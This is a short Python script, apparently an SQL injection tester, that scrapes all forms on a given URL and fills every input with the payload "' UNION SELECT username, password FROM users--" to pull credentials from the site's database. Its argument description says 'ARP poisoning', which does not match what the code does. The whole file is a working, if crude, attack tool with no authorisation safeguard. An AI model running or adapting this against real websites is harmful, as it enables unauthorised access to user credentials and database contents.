from bs4 import BeautifulSoup
from requests_html import HTMLSession
from urllib.parse import urljoin
from pprint import pprint
import argparse
import requests

parser = argparse.ArgumentParser(description="Perform ARP poisoning on a target")
parser.add_argument("url", help="The URL of the website to test for sqli")
# parser.add_argument("X", help="Enter the method")
# parser.add_argument("o", help="Enter the output of archive file")

args = parser.parse_args()


session = HTMLSession()

def get_all_forms(url):
	res = session.get(url)
	soup = BeautifulSoup(res.html.html, "html.parser")
	return soup.find_all("form")

def get_form_details(form):
	"""Returns the HTML details of a form,
	including action, method and list of form controls (inputs, etc)"""
	details = {}
	action = form.attrs.get("action").lower()
	method = form.attrs.get("method", "get").lower()
	inputs = []
	for input_tag in form.find_all("input"):
		input_type = input_tag.attrs.get("type", "text")
		input_name = input_tag.attrs.get("name")
		input_value =input_tag.attrs.get("value", "")
		inputs.append({"type": input_type, "name": input_name, "value": input_value})
	for select in form.find_all("select"):
		select_name = select.attrs.get("name")
		select_type = "select"
		select_options = []
		select_default_value = ""
		for select_option in select.find_all("option"):
			option_value = select_option.attrs.get("value")
			if option_value:
				select_options.append(option_value)
				if select_option.attrs.get("selected"):
					select_default_value = option_value
		if not select_default_value and select_options:
			select_default_value = select_options[0]
		inputs.append({"type": select_type, "name": select_name, "values": select_options, "value": select_default_value})
	for textarea in form.find_all("textarea"):
		textarea_name = textarea.attrs.get("name")
		textarea_type = "textarea"
		textarea_value = textarea.attrs.get("value", "")
		inputs.append({"type": textarea_type, "name": textarea_name, "value": textarea_value})
	details["action"] = action
	details["method"] = method
	details["inputs"] = inputs
	return details

if __name__ == "__main__":
	forms = get_all_forms(args.url)
	for form in forms:
		print(form)
		form_details = get_form_details(form)
		pprint(form_details)
		data = {}
		for input_tag in form_details["inputs"]:
			if input_tag["type"] != "submit":
				data[input_tag["name"]] = "' UNION SELECT username, password FROM users--"
		res = requests.post(args.url, data=data)
		print(res.text)
# print(get_form_details(forms))